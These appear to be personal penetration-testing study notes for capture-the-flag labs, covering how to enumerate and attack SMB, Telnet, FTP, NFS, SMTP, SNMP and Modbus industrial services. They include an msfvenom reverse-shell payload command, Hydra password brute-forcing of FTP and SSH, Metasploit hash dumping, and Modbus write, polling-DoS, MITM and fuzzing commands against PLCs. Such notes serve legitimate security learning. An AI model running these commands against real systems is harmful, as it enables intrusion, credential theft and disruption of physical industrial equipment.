# SMB history
`Support for microsoft win 95`
`Samba -> unix`

# Enumeration

* NMAP
* Enum4linux

# Enum4Linux
```
Enum4linux is a tool used to enumerate SMB shares on both Windows and Linux systems. It is basically a wrapper around the tools in the Samba package and makes it easy to quickly extract information from the target pertaining to SMB. It's installed by default on Parrot and Kali, however if you need to install it, you can do so from the official github.

The syntax of Enum4Linux is nice and simple: "enum4linux [options] ip"

TAG            FUNCTION

-U             get userlist
-M             get machine list
-N             get namelist dump (different from -U and-M)
-S             get sharelist
-P             get password policy information
-G             get group and member list

-A             all of the above (full basic enumeration)

usage

./enum4linux.pl -a <ip>
```

```
Find workgroup
Find name
os v
shares that sticks out
```

# Types of SMB Exploit
```
While there are vulnerabilities such as CVE-2017-7494 that can allow remote code execution by exploiting SMB, you're more likely to encounter a situation where the best way into a system is due to misconfigurations in the system. In this case, we're going to be exploiting anonymous SMB share access- a common misconfiguration that can allow us to gain information that will lead to a shell.

Method Breakdown

So, from our enumeration stage, we know:

    - The SMB share location

    - The name of an interesting SMB share

SMBClient

Because we're trying to access an SMB share, we need a client to access resources on servers. We will be using SMBClient because it's part of the default samba suite. While it is available by default on Kali and Parrot, if you do need to install it, you can find the documentation here.

We can remotely access the SMB share using the syntax:
```
`perl /opt/tools/enum4linux/enum4linux.pl -a  10.10.152.196 | tee enum$linux.log`

`smbclient -L //IP`" `

`smbclient //[IP]/[SHARE]`

Followed by the tags:

-U [name] : to specify the user

-p [port] : to specify the port

-L [list] : to list shares

usage

`smbclient  //10.10.10.2/secret -U suit -p 445`
                            shares         user
`smbclient  //10.10.228.31/profiles  -U anonymous`

`get <file>`
* make dir first
`sudo mount -t nfs IP:share /tmp/newdir` or as root
`mount -t cifs -o username=qiu,password=password //10.10.10.117:/qiu /mnt/mercy`
* in /etc/fstab => `//10.10.10.117/qiu /mnt/mercy cifs username=qiu,password=password` => `mount /mercy`

Could be nfs//cifs

cifs for windows
## exploits

* metasploit cve-2007-2447
* sambacry (authenticated)

# SMBMAP

"smbmap -H IP"
"smbmap -u genericforguest -H IP"
"smbmap -u realuser -p hash:hash -H IP" hash from impacket 


# What is Telnet?
```
Telnet is an application protocol which allows you, with the use of a telnet client, to connect to and execute commands on a remote machine that's hosting a telnet server.

The telnet client will establish a connection with the server. The client will then become a virtual terminal- allowing you to interact with the remote host.

Replacement

Telnet sends all messages in clear text and has no specific security mechanisms. Thus, in many applications and services, Telnet has been replaced by SSH in most implementations.
 
How does Telnet work?

The user connects to the server by using the Telnet protocol, which means entering "telnet" into a command prompt. The user then executes commands on the server by using specific Telnet commands in the Telnet prompt. You can connect to a telnet server with the following syntax: "telnet [ip] [port]"
```
'

# Types of Telnet Exploit

```
Telnet, being a protocol, is in and of itself insecure for the reasons we talked about earlier. It lacks encryption, so sends all communication over plaintext, and for the most part has poor access control. There are CVE's for Telnet client and server systems, however, so when exploiting you can check for those on:

    https://www.cvedetails.com/
    https://cve.mitre.org/

A CVE, short for Common Vulnerabilities and Exposures, is a list of publicly disclosed computer security flaws. When someone refers to a CVE, they usually mean the CVE ID number assigned to a security flaw.

However, you're far more likely to find a misconfiguration in how telnet has been configured or is operating that will allow you to exploit it. 
```

`sudo tcpdump ip proto \\icmp -i tun0`
```
Start a tcpdump listener on your local machine using: "sudo tcpdump ip proto \\icmp -i tun0" This starts a tcpdump listener, specifically listening for ICMP traffic, which pings operate on.
```
```
Now, use the command "ping [local tun0 ip] -c 1" through the telnet session to see if we're able to execute system commands. Do we receive any pings? Note, you need to preface this with 
```
```
We're going to generate a reverse shell payload using msfvenom.This will generate and encode a netcat reverse shell for us. Here's our syntax:
"msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R

.RUN generate 

```

# What is FTP?
```
File Transfer Protocol (FTP) is, as the name suggests , a protocol used to allow remote transfer of files over a network. It uses a client-server model to do this, and- as we'll come on to later- relays commands and data in a very efficient way.

How does FTP work?
A typical FTP session operates using two channels:

    a command (sometimes called the control) channel
    a data channel. 

As their names imply, the command channel is used for transmitting commands as well as replies to those commands, while the data channel is used for transferring data.

FTP operates using a client-server protocol. The client initiates a connection with the server, the server validates whatever login credentials are provided and then opens the session.

While the session is open, the client may execute FTP commands on the server.

Active vs Passive

The FTP server may support either Active or Passive connections, or both. 

    * In an Active FTP connection, the client opens a port and listens. The server is required to actively connect to it. 
    * In a Passive FTP connection, the server opens a port and listens (passively) and the client connects to it.  

This separation of command information and data into separate channels is a way of being able to send commands to the server without having to wait for the current data transfer to finish. If both channels were interlinked, you could only enter commands in between data transfers, which wouldn't be efficient for either large file transfers, or slow internet connections. 
```

```
Usage
ftp <ip>
get <file>
```
# IMAP 
* `nc IP 143` || `ncat --ssl IP 993`
* `SUBSA001 login username password`

# Hydra to brute force ftp

`"hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp"`

# Reading

Here's some things that might be useful to read after completing this room, if it interests you:

    * https://medium.com/@gregIT/exploiting-simple-network-services-in-ctfs-ec8735be5eef
    * https://attack.mitre.org/techniques/T1210/
    * https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/

# NFS

`showmount -e IP`
`mkdir /tmp/raj`
`mount -t nfs 192.168.1.105:/var/nfsshare /tmp/raj`

```
How does NFS work?

Computer network - Vector stencils library | Computers ...

We don't need to understand the technical exchange in too much detail to be able to exploit NFS effectively- however if this is something that interests you, I would recommend this resource: https://docs.oracle.com/cd/E19683-01/816-4882/6mb2ipq7l/index.html

First, the client will request to mount a directory from a remote host on a local directory just the same way it can mount a physical device. The mount service will then act to connect to the relevant mount daemon using RPC.

The server checks if the user has permission to mount whatever directory has been requested. It will then return a file handle which uniquely identifies each file and directory that is on the server.

If someone wants to access a file using NFS, an RPC call is placed to NFSD (the NFS daemon) on the server. This call takes parameters such as:

     The file handle
     The name of the file to be accessed
     The user's, user ID
     The user's group ID

These are used in determining access rights to the specified file. This is what controls user permissions, I.E read and write of files.

What runs NFS?

Using the NFS protocol, you can transfer files between computers running Windows and other non-Windows operating systems, such as Linux, MacOS or UNIX.

A computer running Windows Server can act as an NFS file server for other non-Windows client computers. Likewise, NFS allows a Windows-based computer running Windows Server to access files stored on a non-Windows NFS server.

More Information:

Here are some resources that explain the technical implementation, and working of, NFS in more detail than I have covered here.

https://www.datto.com/library/what-is-nfs-file-share

http://nfs.sourceforge.net/

https://wiki.archlinux.org/index.php/NFS
```
# Port Scanning
```
Port scanning has been covered many times before, so I'll only cover the basics that you need for this room here. If you'd like to learn more about nmap in more detail please have a look at the nmap room.

The first step of enumeration is to
conduct a port scan, to find out as much information as you can about
the services, open ports and operating system of the target
machine. You can go as in depth as you like on this, however I suggest
using nmap with the -A and -p- tags.

Mounting NFS shares

Your clientâ€™s system needs a directory where all the content shared by
the host server in the export folder can be accessed. You can create
this folder anywhere on your system. Once you've created this mount point, you can use the "mount" command to connect the NFS share to the mount point on your machine. Like so:

sudo mount -t nfs IP:share /tmp/mount/ -nolock

Let's break this down
	
Tag 	Function
sudo 	Run as root
mount 	Execute the mount command
-t nfs 	Type of device to mount, then specifying that it's NFS
IP:share 	The IP Address of the NFS server, and the name of the share we wish to mount
-nolock 	Specifies not to use NLM locking
```
# Show nfs Mount 
* /usr/sbin/showmount -e -IP

# What is SMTP?
```
SMTP stands for "Simple Mail Transfer Protocol". It is utilised to handle the sending of emails. In order to support email services, a protocol pair is required, comprising of SMTP and POP/IMAP. Together they allow the user to send outgoing mail and retrieve incoming mail, respectively.

The SMTP server performs three basic functions:

     It verifies who is sending emails through the SMTP server.
     It sends the outgoing mail
     If the outgoing mail can't be delivered it sends the message back to the sender

Most people will have encountered SMTP when configuring a new email address on some third-party email clients, such as Thunderbird; as when you configure a new email client, you will need to configure the SMTP server configuration in order to send outgoing emails.

POP and IMAP

POP, or "Post Office Protocol" and IMAP, "Internet Message Access Protocol" are both email protocols who are responsible for the transfer of email between a client and a mail server. The main differences is in POP's more simplistic approach of downloading the inbox from the mail server, to the client. Where IMAP will synchronise the current inbox, with new mail on the server, downloading anything new. This means that changes to the inbox made on one computer, over IMAP, will persist if you then synchronise the inbox from another computer. The POP/IMAP server is responsible for fulfiling this process.

How does SMTP work?

Email delivery functions much the same as the physical mail delivery system. The user will supply the email (a letter) and a service (the postal delivery service), and through a series of steps- will deliver it to the recipients inbox (postbox). The role of the SMTP server in this service, is to act as the sorting office, the email (letter) is picked up and sent to this server, which then directs it to the recipient.

We can map the journey of an email from your computer to the recipientâ€™s like this:

1. The mail user agent, which is either your email client or an external program. connects to the SMTP server of your domain, e.g. smtp.google.com. This initiates the SMTP handshake. This connection works over the SMTP port- which is usually 25. Once these connections have been made and validated, the SMTP session starts.

2. The process of sending mail can now begin. The client first submits the sender, and recipient's email address- the body of the email and any attachments, to the server.

3. The SMTP server then checks whether the domain name of the recipient and the sender is the same.

4. The SMTP server of the sender will make a connection to the recipient's SMTP server before relaying the email. If the recipient's server can't be accessed, or is not available- the Email gets put into an SMTP queue.

5. Then, the recipient's SMTP server will verify the incoming email. It does this by checking if the domain and user name have been recognised. The server will then forward the email to the POP or IMAP server, as shown in the diagram above.

6. The E-Mail will then show up in the recipient's inbox.

This is a very simplified version of the process, and there are a lot of sub-protocols, communications and details that haven't been included. If you're looking to learn more about this topic, this is a really friendly to read breakdown of the finer technical details- I actually used it to write this breakdown:

https://computer.howstuffworks.com/e-mail-messaging/email3.htm

What runs SMTP?

SMTP Server software is readily available on Windows server platforms, with many other variants of SMTP being available to run on Linux.

More Information:

Here is a resource that explain the technical implementation, and working of, SMTP in more detail than I have covered here.

https://www.afternerd.com/blog/smtp/
```
# Hydra to brute force SSH

`"hydra -t 16 -l Administrator -P /usr/share/wordlists/rockyou.txt -vV 10.10.153.219 ssh"`

# SQL Auxi

* auxiliary/scanner/mysql/mysql_schemadump
* auxiliary/scanner/mysql/mysql_hashdump

# Port Knocking removes fileterd ssh

# global protect

* sudo dpkg -i GlobalProtect_deb-5.3.2.0-3.deb  
* globalprotect >> connect -p 10.0.0.6 -u zeke

# SNMP 

* `snmpwalk -v 1 -c public 10.10.11.136`

# Modbus
modbusPal -> sim

coils (1 bit) for e.g on/off 
registers (16bits) for e.g temp / volt

Important to map the names of the coils/registers

## Enum
msf modbusclient
enum 
mbtget (-h)
    Coil
    -u (ID) -p (port) -r1 -a (starting addr) -n (number of coils read) IP
    -u 1 -p 502 -r1 -a 0 -n 2 127.0.0.1
    Register
    -u 1 -p 502 -r3 -a 0 -n 2 127.0.0.1
smod
msf modbus
    modbus_banner_grabing
    modbus_client (action: read coils number: 112 data_address: 1 )


rodbus-client (new) (rust)
    rodbus-client --help
    rodbus-client rc --help

    Read coils and registers
    rodbus-client -h IP:502 rc --start 0 --quantity 2
    rodbus-client -h IP:502 rhr --start 0 --quantity 4

    Write Coils
    rodbus-client -h IP:502 wsc --index 0 --value false (single coil action)
    rodbus-client -h IP:502 wmc --start 0 --values 11 (multi coil action) (1 1 not eleven)

    Write Registers
    rodbus-client -h IP:502 wsr --index 3 --value 220 (change register with index 3's value to 220)
    rodbus-client -h IP:502 wsr --index 1 --value 220

    Polling
    rodbus-client -h IP:502 -p 2000 rhr --start 0 --quantity 4 (read the coil every 2 seconds) (could be used to dos coils/registers)

MITM
    bettercap
    ettercap (arp spoof connection to drop or change packets on the fly) (SANS ICS Concepts)


Wireshark 
Filter: modbus
Statistics -> endpoints

modbus.func_code > 4 (filters write )
modbus.func_code == 90 (Schneider's Plc functions)

Tshark
tshark -r PCAP.pcap -T fields -r frame.number -e ip.src -e tcp.dstport -e modbus.func_code -e modbus.data -F separator=,

## Fuzzing for crashes

cat /dev/urandom  | nc IP 502

smod > show modules
smod > use modbus/function/fuzzing
smod > show options 
smod > set RHOST 
smod > set UID 0
smod > exploit 

modFuzzer.py -D IP